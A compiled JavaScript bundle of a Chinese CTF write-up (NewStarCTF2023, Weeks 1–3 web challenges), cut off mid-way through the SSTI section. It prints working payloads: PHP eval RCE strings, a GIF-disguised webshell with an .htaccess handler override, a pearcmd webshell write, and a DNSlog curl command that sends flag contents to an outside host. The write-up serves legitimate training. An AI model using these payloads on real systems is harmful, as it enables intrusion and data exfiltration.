"use strict";(self.webpackChunkremote_website=self.webpackChunkremote_website||[]).push([[5141],{28453:(n,e,i)=>{i.d(e,{R:()=>l,x:()=>r});var s=i(96540);const c={},a=s.createContext(c);function l(n){const e=s.useContext(a);return s.useMemo((function(){return"function"==typeof n?n(e):{...e,...n}}),[e,n])}function r(n){let e;return e=n.disableParentContext?"function"==typeof n.components?n.components(c):n.components||c:l(n.components),s.createElement(a.Provider,{value:e},n.children)}},95599:(n,e,i)=>{i.r(e),i.d(e,{assets:()=>d,contentTitle:()=>r,default:()=>t,frontMatter:()=>l,metadata:()=>s,toc:()=>p});const s=JSON.parse('{"id":"CTF/Misc/NewStarCTF2023","title":"NewStarCTF2023","description":"Week1","source":"@site/docs/CTF/Misc/NewStarCTF2023.md","sourceDirName":"CTF/Misc","slug":"/CTF/Misc/NewStarCTF2023","permalink":"/docs/CTF/Misc/NewStarCTF2023","draft":false,"unlisted":false,"editUrl":"https://github.com/C0rr3c7/C0rr3c7.github.io/tree/master/docs/CTF/Misc/NewStarCTF2023.md","tags":[],"version":"current","frontMatter":{},"sidebar":"CTFSidebar","previous":{"title":"NSSCTF Round-20 Basic\u4e2a\u4ebaWEB\u4e13\u573a","permalink":"/docs/CTF/Misc/NSSCTF Round-20 Basic\u4e2a\u4ebaWEB\u4e13\u573a"},"next":{"title":"Nodejs\u5e38\u89c1\u6f0f\u6d1e","permalink":"/docs/CTF/Misc/Nodejs\u5e38\u89c1\u6f0f\u6d1e"}}');var c=i(74848),a=i(28453);const l={},r=void 0,d={},p=[{value:"Week1",id:"week1",level:2},{value:"ErrorFlask",id:"errorflask",level:3},{value:"Begin of PHP",id:"begin-of-php",level:3},{value:"R!C!E!",id:"rce",level:3},{value:"EasyLogin",id:"easylogin",level:3},{value:"Week2",id:"week2",level:2},{value:"include 0\u30020",id:"include-00",level:3},{value:"R!!C!!E!!",id:"rce-1",level:3},{value:"Upload again!",id:"upload-again",level:3},{value:"[SWPUCTF 2023 \u79cb\u5b63\u65b0\u751f\u8d5b]RCE-PLUS",id:"swpuctf-2023-\u79cb\u5b63\u65b0\u751f\u8d5brce-plus",level:3},{value:"[SWPUCTF 2023 \u79cb\u5b63\u65b0\u751f\u8d5b]If_else",id:"swpuctf-2023-\u79cb\u5b63\u65b0\u751f\u8d5bif_else",level:3},{value:"Week3",id:"week3",level:2},{value:"Include \ud83c\udf50",id:"include-",level:3},{value:"R!!!C!!!E!!!",id:"rce-2",level:3},{value:"GenShin",id:"genshin",level:3},{value:"Week4",id:"week4",level:2},{value:"\u9003",id:"\u9003",level:3},{value:"More Fast",id:"more-fast",level:3},{value:"\u6e90\u4ee3\u7801\uff1a",id:"\u6e90\u4ee3\u7801",level:4},{value:"\u8003\u70b9\uff1a",id:"\u8003\u70b9",level:4},{value:"\u89e3\u9898",id:"\u89e3\u9898",level:4},{value:"So Baby RCE",id:"so-baby-rce",level:3},{value:"UnserializeThree",id:"unserializethree",level:3},{value:"flask disk",id:"flask-disk",level:3},{value:"PharOne",id:"pharone",level:3},{value:"Week5",id:"week5",level:2},{value:"So Baby RCE Again",id:"so-baby-rce-again",level:3},{value:"Unserialize Again",id:"unserialize-again",level:3},{value:"Final",id:"final",level:3},{value:"4-\u590d\u76d8",id:"4-\u590d\u76d8",level:3}];function h(n){const e={a:"a",blockquote:"blockquote",code:"code",em:"em",h2:"h2",h3:"h3",h4:"h4",img:"img",p:"p",pre:"pre",...(0,a.R)(),...n.components};return(0,c.jsxs)(c.Fragment,{children:[(0,c.jsx)(e.h2,{id:"week1",children:"Week1"}),"\n",(0,c.jsx)(e.h3,{id:"errorflask",children:"ErrorFlask"}),"\n",(0,c.jsx)(e.p,{children:"\u9898\u76ee"}),"\n",(0,c.jsx)(e.p,{children:(0,c.jsx)(e.img,{src:"https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231019124225948.png",alt:"image-20231019124225948"})}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{children:"?number1=1&number2=2\n"})}),"\n",(0,c.jsx)(e.p,{children:"\u63d0\u793a\u56de\u663e"}),"\n",(0,c.jsx)(e.p,{children:(0,c.jsx)(e.img,{src:"https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231019124424685.png",alt:"image-20231019124424685"})}),"\n",(0,c.jsxs)(e.p,{children:["\u7528",(0,c.jsx)(e.code,{children:"{{}}"}),"\u5305\u88f9\u53c2\u6570\u8fdb\u884c\u4f20\u53c2\uff0c\u56de\u663e\u4e86\u4e00\u4e2a\u9519\u8bef\u754c\u9762\uff0cflag\u4e5f\u51fa\u6765\u4e86"]}),"\n",(0,c.jsx)(e.p,{children:(0,c.jsx)(e.img,{src:"https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231019124641860.png",alt:"image-20231019124641860"})}),"\n",(0,c.jsx)(e.h3,{id:"begin-of-php",children:"Begin of PHP"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{className:"language-php",children:"if($flag1){\n    echo \"=Level 2=<br>\";\n    if(isset($_POST['key3'])){\n        if(md5($_POST['key3']) === sha1($_POST['key3'])){\n            $flag2 = True;\n        }\n    }else{\n        die(\"nope,this is level 2\");\n    }\n}\n"})}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{children:"md5()\uff0csha1()\u51fd\u6570\u65e0\u6cd5\u5904\u7406\u6570\u7ec4\uff0c\u5982\u679c\u4f20\u5165\u7684\u4e3a\u6570\u7ec4\uff0c\u4f1a\u8fd4\u56deNULL\uff0c\u6240\u4ee5\u4e24\u4e2a\u6570\u7ec4\u7ecf\u8fc7\u52a0\u5bc6\u540e\u5f97\u5230\u7684\u90fd\u662fNULL\uff0c\u4e5f\u5c31\u662f\u76f8\u7b49\u7684\u3002key3[]=1\n"})}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{className:"language-php",children:'if($flag2){\n    echo "=Level 3=<br>";\n    if(isset($_GET[\'key4\'])){\n        if(strcmp($_GET[\'key4\'],file_get_contents("/flag")) == 0){\n            $flag3 = True;\n        }else{\n            die("nope,this is level 3");\n        }\n    }\n}\n'})}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{children:"strcmp()\u51fd\u6570\u7528\u4e8e\u6bd4\u8f83\u4e24\u4e2a\u5b57\u7b26\u4e32\u5e76\u6839\u636e\u6bd4\u8f83\u7ed3\u679c\u8fd4\u56de\u6574\u6570\u3002\u57fa\u672c\u5f62\u5f0f\u4e3astrcmp(str1,str2)\uff0c\u82e5str1=str2\uff0c\u5219\u8fd4\u56de\u96f6\uff1b\u82e5str1<str2\uff0c\u5219\u8fd4\u56de\u8d1f\u6570\uff1b\u82e5str1>str2\uff0c\u5219\u8fd4\u56de\u6b63\u6570\u3002\n"})}),"\n",(0,c.jsxs)(e.p,{children:["\u8fd9\u4e2astrcmp()\u51fd\u6570\u4f20\u5165\u6570\u7ec4\u7684\u8bdd\uff0c\u76f4\u63a5\u4f1a\u8fd4\u56de\u4e00\u4e2a0\u3002",(0,c.jsx)(e.code,{children:"key4[]=1"})]}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{className:"language-php",children:'if($flag4){\n    echo "=Level 5=<br>";\n    extract($_POST);\n    foreach($_POST as $var){\n        if(preg_match("/[a-zA-Z0-9]/",$var)){\n            die("nope,this is level 5");\n        }\n    }\n    if($flag5){\n        echo file_get_contents("/flag");\n    }else{\n        die("nope,this is level 5");\n    }\n}\n'})}),"\n",(0,c.jsx)(e.p,{children:"\u6211\u4eec\u53ea\u9700\u8981\u5c06true\u8d4b\u503c\u7ed9flag5\uff0c\u4f46\u662f\u4e0d\u80fd\u6709\u5927\u5c0f\u5199\u5b57\u6bcd\u548c\u6570\u5b57\uff0c\u6211\u4eec\u53ef\u4ee5\u8fdb\u884c\u53d6\u53cd"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{className:"language-php",children:"<?php\n$a = 'true';\necho urlencode(~$a);\n?> // flag5=(~%8B%8D%8A%9A)()\n"})}),"\n",(0,c.jsx)(e.p,{children:"preg_match() \u4e0d\u63a5\u53d7\u6570\u7ec4\u4f5c\u4e3a\u53c2\u6570\uff0c\u53ea\u63a5\u53d7\u5b57\u7b26\u4e32\u3002"}),"\n",(0,c.jsxs)(e.p,{children:["\u8fd8\u53ef\u4ee5\u6570\u7ec4\u8fdb\u884c\u7ed5\u8fc7\uff0c",(0,c.jsx)(e.code,{children:"flag5[]=true"})]}),"\n",(0,c.jsx)(e.h3,{id:"rce",children:"R!C!E!"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{className:"language-php",children:" <?php\nhighlight_file(__FILE__);\nif(isset($_POST['password'])&&isset($_POST['e_v.a.l'])){\n    $password=md5($_POST['password']);\n    $code=$_POST['e_v.a.l'];\n    if(substr($password,0,6)===\"c4d038\"){\n        if(!preg_match(\"/flag|system|pass|cat|ls/i\",$code)){\n            eval($code);\n        }\n    }\n}\n"})}),"\n",(0,c.jsx)(e.p,{children:"\u5ba1\u8ba1\u4ee3\u7801"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{children:"password\u7684MD5\u503c\u7684\u524d\u516d\u4f4d\u662fc4d038\ne_v.a.l\u7684\u503c\u4e0d\u80fd\u662fflag\u90a3\u4e9b\u5b57\u7b26\n"})}),"\n",(0,c.jsxs)(e.p,{children:["\u53d1\u73b0",(0,c.jsx)(e.code,{children:"114514"}),"\u7684MD5\u503c\u7684\u524d\u516d\u4f4d\u662fc4d038\uff0c\u6240\u4ee5password=114514"]}),"\n",(0,c.jsxs)(e.p,{children:["\u5728post\u4f20\u53c2\u65f6\uff0c\u53d8\u91cf\u540d\u91cc\u7684\u70b9\u548c\u7a7a\u683c\u662f\u975e\u6cd5\u5b57\u7b26\uff0c\u4f1a\u88ab\u8f6c\u5316\u4e3a",(0,c.jsx)(e.code,{children:"_"})]}),"\n",(0,c.jsxs)(e.p,{children:["\u8fd9\u91cc\u6709\u4e00\u4e2a\u6f0f\u6d1e\uff0c\u5982\u679c\u53d8\u91cf\u6709",(0,c.jsx)(e.code,{children:"["}),"\uff0c\u5b83\u4f1a\u88ab\u8f6c\u6362\u6210",(0,c.jsx)(e.code,{children:"_"}),",\u4f46\u4e2d\u62ec\u53f7\u540e\u9762\u7684\u975e\u6cd5\u5b57\u7b26\u5c31\u4e0d\u4f1a\u88ab\u8f6c\u53d8"]}),"\n",(0,c.jsxs)(e.p,{children:["\u6211\u4eec\u4f20\u7684\u53d8\u91cf\u540d\u662f",(0,c.jsx)(e.code,{children:"e[v.a.l"})]}),"\n",(0,c.jsxs)(e.p,{children:["payload\uff1a",(0,c.jsx)(e.code,{children:"password=114514&e[v.a.l=eval($_POST[1]);&1=system('cat /flag');"})]}),"\n",(0,c.jsxs)(e.p,{children:["\u5176\u4ed6\u59ff\u52bf\uff1a",(0,c.jsx)(e.code,{children:"password=114514&e[v.a.l=echo "}),"nl /f* ",(0,c.jsx)(e.code,{children:";"})]}),"\n",(0,c.jsx)(e.p,{children:"\u641c\u96c6\u4e86\u4e00\u4e9b\u4e0ecat\u547d\u4ee4\u5dee\u4e0d\u591a\u7684\u547d\u4ee4"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{children:"more:\u4e00\u9875\u4e00\u9875\u7684\u663e\u793a\u6863\u6848\u5185\u5bb9\nhead:\u67e5\u770b\u5934\u51e0\u884c\ntac:\u4ece\u6700\u540e\u4e00\u884c\u5f00\u59cb\u663e\u793a\uff0c\u53ef\u4ee5\u770b\u51fa tac \u662f cat \u7684\u53cd\u5411\u663e\u793a\ntail:\u67e5\u770b\u5c3e\u51e0\u884c\nnl\uff1a\u663e\u793a\u7684\u65f6\u5019\uff0c\u987a\u4fbf\u8f93\u51fa\u884c\u53f7\nod:\u4ee5\u4e8c\u8fdb\u5236\u7684\u65b9\u5f0f\u8bfb\u53d6\u6863\u6848\u5185\u5bb9\nsort:\u53ef\u4ee5\u67e5\u770b\nuniq:\u53ef\u4ee5\u67e5\u770b\nstrings:\u53ef\u4ee5\u67e5\u770b\nrev:\u53cd\u8fc7\u6765\u770b\n"})}),"\n",(0,c.jsx)(e.h3,{id:"easylogin",children:"EasyLogin"}),"\n",(0,c.jsx)(e.p,{children:"\u5c31\u662f\u4e00\u4e2a\u5f31\u53e3\u4ee4\u7206\u7834\uff0c\u5b83\u7684\u5bc6\u7801\u4f1a\u8fdb\u884cmd5\u52a0\u5bc6"}),"\n",(0,c.jsx)(e.p,{children:(0,c.jsx)(e.img,{src:"https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231019173854276.png",alt:"image-20231019173854276"})}),"\n",(0,c.jsx)(e.p,{children:"\u5728\u7206\u7834\u7684\u65f6\u5019\uff0c\u8bbe\u7f6e\u4e00\u4e0b"}),"\n",(0,c.jsx)(e.p,{children:(0,c.jsx)(e.img,{src:"https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231019174042511.png",alt:"image-20231019174042511"})}),"\n",(0,c.jsx)(e.p,{children:(0,c.jsx)(e.img,{src:"https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231019174238726.png",alt:"image-20231019174238726"})}),"\n",(0,c.jsx)(e.p,{children:(0,c.jsx)(e.img,{src:"https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231019174527979.png",alt:"image-20231019174527979"})}),"\n",(0,c.jsx)(e.h2,{id:"week2",children:"Week2"}),"\n",(0,c.jsx)(e.h3,{id:"include-00",children:"include 0\u30020"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{className:"language-php",children:" <?php\nhighlight_file(__FILE__);\n// FLAG in the flag.php\n$file = $_GET['file'];\nif(isset($file) && !preg_match('/base|rot/i',$file)){\n    @include($file);\n}else{\n    die(\"nope\");\n}\n?>\n"})}),"\n",(0,c.jsx)(e.p,{children:"\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\uff0c\u8fc7\u6ee4\u4e86base\u548crot\uff0c\u6362\u4e00\u4e2a\u8fc7\u6ee4\u5668\u5c31\u53ef\u4ee5"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{className:"language-php",children:"php://filter/convert.iconv.utf-8.utf-16/resource=flag.php\n"})}),"\n",(0,c.jsx)(e.h3,{id:"rce-1",children:"R!!C!!E!!"}),"\n",(0,c.jsx)(e.p,{children:"\u9898\u76ee"}),"\n",(0,c.jsx)(e.p,{children:(0,c.jsx)(e.img,{src:"https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231019180414346.png",alt:"image-20231019180414346"})}),"\n",(0,c.jsx)(e.p,{children:"\u8bf4\u662f\u6cc4\u9732\u4e86\u4fe1\u606f\uff0c\u7528githack\u8fdb\u884c\u6062\u590d"}),"\n",(0,c.jsx)(e.p,{children:(0,c.jsx)(e.img,{src:"https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231019180656607.png",alt:"image-20231019180656607"})}),"\n",(0,c.jsxs)(e.p,{children:["\u6709\u4e00\u4e2a",(0,c.jsx)(e.code,{children:"bo0g1pop.php"})]}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{children:"<?php\nhighlight_file(__FILE__);\nif (';' === preg_replace('/[^\\W]+\\((?R)?\\)/', '', $_GET['star'])) {\n    if(!preg_match('/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i',$_GET['star'])){\n        eval($_GET['star']);\n    }\n}\n"})}),"\n",(0,c.jsx)(e.p,{children:(0,c.jsx)(e.img,{src:"https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231019181017538.png",alt:"image-20231019181017538"})}),"\n",(0,c.jsxs)(e.p,{children:["\u5982\u679c\u4f20\u8fdb\u53bb\u7684\u503c\u662f\u4f20\u8fdb\u53bb\u7684\u503c\u662f\u5b57\u7b26\u4e32\u63a5\u4e00\u4e2a",(0,c.jsx)(e.code,{children:"()"}),"\uff0c\u90a3\u4e48\u5b57\u7b26\u4e32\u5c31\u4f1a\u88ab\u66ff\u6362\u4e3a\u7a7a\u3002\u5982\u679c\uff08\u9012\u5f52\uff09\u66ff\u6362\u540e\u7684\u5b57\u7b26\u4e32\u53ea\u5269\u4e0b",(0,c.jsx)(e.code,{children:";"}),"\uff0c\u4ee3\u7801\u5c31\u4f1a\u88ab\u6267\u884c"]}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{className:"language-php",children:"getallheaders() //\u53d6\u51fa\u6240\u6709http\u8bf7\u6c42\u5934\u4fe1\u606f\uff0c\u8fd4\u56de\u4e00\u4e2a\u6570\u7ec4\narray_flip() //\u51fd\u6570\u7528\u4e8e\u53cd\u8f6c/\u4ea4\u6362\u6570\u7ec4\u4e2d\u6240\u6709\u7684\u952e\u540d\u4ee5\u53ca\u5b83\u4eec\u5173\u8054\u7684\u952e\u503c\narray_rand() //\u51fd\u6570\u8fd4\u56de\u6570\u7ec4\u4e2d\u7684\u968f\u673a\u952e\u540d\uff0c\u6216\u8005\u5982\u679c\u60a8\u89c4\u5b9a\u51fd\u6570\u8fd4\u56de\u4e0d\u53ea\u4e00\u4e2a\u952e\u540d\uff0c\u5219\u8fd4\u56de\u5305\u542b\u968f\u673a\u952e\u540d\u7684\u6570\u7ec4\n"})}),"\n",(0,c.jsx)(e.p,{children:(0,c.jsx)(e.img,{src:"https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231019183349732.png",alt:"image-20231019183349732"})}),"\n",(0,c.jsx)(e.h3,{id:"upload-again",children:"Upload again!"}),"\n",(0,c.jsx)(e.p,{children:"\u4e0a\u4f20\u56fe\u7247\u4e00\u53e5\u8bdd\u6728\u9a6c"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{className:"language-php",children:"<?php eval($_POST[1]); ?>\n"})}),"\n",(0,c.jsx)(e.p,{children:"\u53d1\u73b0\u88ab\u8fc7\u6ee4\u4e86"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{className:"language-javascript",children:"GIF89a\n<script language=\"php\">\neval($_POST['a']);\n<\/script>\n"})}),"\n",(0,c.jsxs)(e.p,{children:["\u4e0a\u4f20",(0,c.jsx)(e.code,{children:".htaccess"})]}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{children:'<FilesMatch "3.png">\nSetHandler application/x-httpd-php\n</FilesMatch>\n'})}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{className:"language-php",children:"SetHandler application/x-httpd-php //\u6240\u6709\u4e0a\u4f20\u6587\u4ef6\u89e3\u6790\u4e3aphp\u7c7b\u578b\n"})}),"\n",(0,c.jsx)(e.p,{children:"\u4e0a\u4f20\u6210\u529f\u540e\u5c31\u53ef\u4ee5\u8fdb\u884c\u4f20\u53c2"}),"\n",(0,c.jsx)(e.h3,{id:"swpuctf-2023-\u79cb\u5b63\u65b0\u751f\u8d5brce-plus",children:"[SWPUCTF 2023 \u79cb\u5b63\u65b0\u751f\u8d5b]RCE-PLUS"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{className:"language-php",children:'<?php\nerror_reporting(0);\nhighlight_file(__FILE__);\nfunction strCheck($cmd)\n{\n    if(!preg_match("/\\;|\\&|\\\\$|\\x09|\\x26|more|less|head|sort|tail|sed|cut|awk|strings|od|php|ping|flag/i", $cmd)){\n        return($cmd);\n    }\n    else{\n        die("i hate this");      \n      }\n}\n$cmd=$_GET[\'cmd\'];\nstrCheck($cmd);\nshell_exec($cmd);\n?>\n'})}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{className:"language-php",children:"//\u65e0\u56de\u663e\u7684\u51fd\u6570\uff0c\u9700\u8981echo\u8fdb\u884c\u8f93\u51fa\nshell_exec()\nexec()\n//\u6709\u56de\u663e\u7684\u51fd\u6570\npassthru()\nsystem()\n"})}),"\n",(0,c.jsx)(e.p,{children:"\u59ff\u52bf\u4e00\uff1a"}),"\n",(0,c.jsxs)(e.p,{children:["\u76f4\u63a5\u5229\u7528",(0,c.jsx)(e.code,{children:">"}),"\u76f4\u63a5\u8f93\u51fa\u7ed3\u679c\u5230\u6587\u4ef6"]}),"\n",(0,c.jsx)(e.p,{children:"payload:"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{children:"ls />1\ncat /fl*>1\n"})}),"\n",(0,c.jsx)(e.p,{children:"\u59ff\u52bf\u4e8c\uff1a"}),"\n",(0,c.jsx)(e.p,{children:"\u5229\u7528\u5e26\u5916\u51faflag"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{children:"\u547d\u4ee4\uff1a\ncurl ``.\u57df\u540d\npayload:\ncurl `cat /fl*`.k8cg5h.dnslog.cn\n"})}),"\n",(0,c.jsx)(e.p,{children:(0,c.jsx)(e.img,{src:"https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231023224311602.png",alt:"image-20231023224311602"})}),"\n",(0,c.jsx)(e.h3,{id:"swpuctf-2023-\u79cb\u5b63\u65b0\u751f\u8d5bif_else",children:"[SWPUCTF 2023 \u79cb\u5b63\u65b0\u751f\u8d5b]If_else"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{className:"language-php",children:" <?php\n    $a=false;\n    $b=false;\n    if(\u4f60\u63d0\u4ea4\u7684\u90e8\u5206\u5c06\u4f1a\u88ab\u5199\u81f3\u8fd9\u91cc)\n    {$a=true;}\n    else\n    {$b=true;}\n    if($a===true&&$b===true)\n    eval(system(cat /flag));\n?>\n"})}),"\n",(0,c.jsx)(e.p,{children:"payload:"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{children:"check=1==1) {system('cat /fl*');} /*\n"})}),"\n",(0,c.jsx)(e.p,{children:"\u76f4\u63a5\u6267\u884c\u4ee3\u7801\uff0c\u7528/*\u5c06\u540e\u9762\u4ee3\u7801\u8fdb\u884c\u6ce8\u91ca"}),"\n",(0,c.jsx)(e.h2,{id:"week3",children:"Week3"}),"\n",(0,c.jsx)(e.h3,{id:"include-",children:"Include \ud83c\udf50"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{className:"language-php",children:" <?php\n    error_reporting(0);\n    if(isset($_GET['file'])) {\n        $file = $_GET['file'];\n        \n        if(preg_match('/flag|log|session|filter|input|data/i', $file)) {\n            die('hacker!');\n        }\n        include($file.\".php\");\n        # Something in phpinfo.php!\n    }\n    else {\n        highlight_file(__FILE__);\n    }\n?>\n"})}),"\n",(0,c.jsxs)(e.p,{children:["\u63d0\u793a\u770b",(0,c.jsx)(e.code,{children:"phpinfo.php"})]}),"\n",(0,c.jsx)(e.p,{children:(0,c.jsx)(e.img,{src:"https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231024215224955.png",alt:"image-20231024215224955"})}),"\n",(0,c.jsx)(e.p,{children:(0,c.jsx)(e.img,{src:"https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231024215239939.png",alt:"image-20231024215239939"})}),"\n",(0,c.jsx)(e.p,{children:"\u53d1\u73b0register_argc_argv\u662f\u5f00\u542f\u72b6\u6001\uff0c\u641c\u7d22\u5f97\u5230\u662f\u8981\u5229\u7528pearcmd\u547d\u4ee4\u6267\u884c"}),"\n",(0,c.jsx)(e.p,{children:(0,c.jsx)(e.a,{href:"https://www.cnblogs.com/Yu--/p/15788689.html",children:"\u5177\u4f53\u70b9\u8fd9\u91cc"})}),"\n",(0,c.jsx)(e.p,{children:"payload\uff1a"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{className:"language-php",children:"?file=/usr/local/lib/php/pearcmd&+config-create+/<?=@eval($_POST['a'])?>+/tmp/1.php\n"})}),"\n",(0,c.jsxs)(e.p,{children:["\u5404\u4e2a\u53c2\u6570\u7528",(0,c.jsx)(e.code,{children:"+"}),"\u5206\u5f00\uff0c\u5e76\u4f20\u53c2"]}),"\n",(0,c.jsxs)(e.p,{children:["\u8fd9\u91cc\u8981\u7528burp\u53ca\u8fdb\u884c\u4f20\u53c2\uff0c\u7528hackbar",(0,c.jsx)(e.code,{children:">"}),"\u8fd9\u4e9b\u5b57\u7b26\u4f1a\u88aburl\u7f16\u7801"]}),"\n",(0,c.jsx)(e.p,{children:(0,c.jsx)(e.img,{src:"https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231024220315095.png",alt:"image-20231024220315095"})}),"\n",(0,c.jsx)(e.p,{children:"\u4e0a\u4f20\u6210\u529f\u540e\uff0c\u6211\u4eec\u8bbf\u95ee"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{children:"?file=/tmp/1  //\u9898\u76ee\u540e\u9762\u662f\u5e26\u7740.php\u7684\n"})}),"\n",(0,c.jsx)(e.p,{children:"\u7136\u540e\u8fdb\u884crce\u5c31\u884c\u4e86"}),"\n",(0,c.jsx)(e.p,{children:(0,c.jsx)(e.img,{src:"https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231024221039650.png",alt:"image-20231024221039650"})}),"\n",(0,c.jsx)(e.h3,{id:"rce-2",children:"R!!!C!!!E!!!"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{className:"language-php",children:" <?php\nhighlight_file(__FILE__);\nclass minipop{\n    public $code;\n    public $qwejaskdjnlka;\n    public function __toString()\n    {\n        if(!preg_match('/\\\\$|\\.|\\!|\\@|\\#|\\%|\\^|\\&|\\*|\\?|\\{|\\}|\\>|\\<|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i', $this->code)){\n            exec($this->code);\n        }\n        return \"alright\";\n    }\n    public function __destruct()\n    {\n        echo $this->qwejaskdjnlka;\n    }\n}\nif(isset($_POST['payload'])){\n    //wanna try?\n    unserialize($_POST['payload']);\n}\n"})}),"\n",(0,c.jsx)(e.p,{children:"\u8fd9\u4e2a\u53cd\u5e8f\u5217\u5316\u76f4\u63a5\u8fdb\u884c\u89e6\u53d1tostring\u5c31\u53ef\u4ee5"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{className:"language-php",children:"<?php\nclass minipop\n{\n    public $code = \"cat /flag_is_h3eeere |script 1\";  //cat /flag_is_h3eeere | t''ee b\n    public $qwejaskdjnlka;\n}\n$a = new minipop();\n$b = new minipop();\n$b->qwejaskdjnlka = $a;\necho serialize($b);\n"})}),"\n",(0,c.jsx)(e.p,{children:"\u547d\u4ee4\uff1a"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{className:"language-php",children:"ls / | t''ee b\ncat /flag_is_h3eeere | t''ee b\ncat /flag_is_h3eeere |script 1\n"})}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{children:"Linux tee\u547d\u4ee4\u7528\u4e8e\u8bfb\u53d6\u6807\u51c6\u8f93\u5165\u7684\u6570\u636e\uff0c\u5e76\u5c06\u5176\u5185\u5bb9\u8f93\u51fa\u6210\u6587\u4ef6\u3002\ntee file1 file2 //\u590d\u5236\u6587\u4ef6\nls /|tee 1.txt //\u547d\u4ee4\u8f93\u51fa\n"})}),"\n",(0,c.jsxs)(e.p,{children:["\u7528\u8fd9\u4e2a",(0,c.jsx)(e.code,{children:"cat /flag_is_h3eeere |script 1"}),"\u5c06\u6587\u4ef6\u5185\u5bb9\u5199\u8fdb",(0,c.jsx)(e.code,{children:"1"}),"\u6587\u4ef6\uff0c\u8bbf\u95ee1\u5c31\u53ef\u4ee5"]}),"\n",(0,c.jsx)(e.p,{children:(0,c.jsx)(e.img,{src:"https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231024222024890.png",alt:"image-20231024222024890"})}),"\n",(0,c.jsx)(e.h3,{id:"genshin",children:"GenShin"}),"\n",(0,c.jsx)(e.p,{children:"\u8fd9\u91ccGET\u4f20\u53c2\uff0c\u4f20\u4ec0\u4e48\u8fd4\u56de\u4ec0\u4e48\uff0c\u5e94\u8be5\u662fssti\u6a21\u677f\u6ce8\u5165"}),"\n",(0,c.jsx)(e.p,{children:(0,c.jsx)(e.img,{src:"https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231031220913440.png",alt:"image-20231031220913440"})}),"\n",(0,c.jsxs)(e.p,{children:["\u7528",(0,c.jsx)(e.code,{children:"{{}}"}),"\u53d1\u73b0\u88ab\u8fc7\u6ee4\u4e86,\u8fd9\u91cc\u8fd8\u53ef\u4ee5\u7528",(0,c.jsx)(e.code,{children:"{% %}"}),"\u4e5f\u53ef\u4ee5\u6267\u884c\u547d\u4ee4"]}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{children:"\u770b\u4e00\u4e0b\u5b50\u7c7b\n{%print(\"\".__class__.__mro__[1].__subclasses__())%}\n\u627e\u4e00\u4e0b\u80fd\u7528\u7684\u6a21\u677f<class 